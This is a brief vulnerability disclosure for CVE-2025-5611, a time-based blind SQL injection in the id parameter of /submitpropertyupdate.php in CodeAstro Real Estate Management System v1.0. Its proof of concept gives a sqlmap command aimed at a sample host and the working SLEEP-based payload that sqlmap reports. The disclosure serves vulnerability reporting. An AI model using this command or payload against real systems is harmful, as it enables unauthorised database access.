# CVE-2025-5611

SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /submitpropertyupdate.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /submitpropertyupdate.php

**Version**

- V1.0

### POC

```
sqlmap -u www.realestate.com/submitpropertyupdate.php?id=1 --technique T --level 3 --batch
```



```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3981 FROM (SELECT(SLEEP(5)))tcRF)-- fJPB
---
```



![image-20250602124213755](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021242906.png)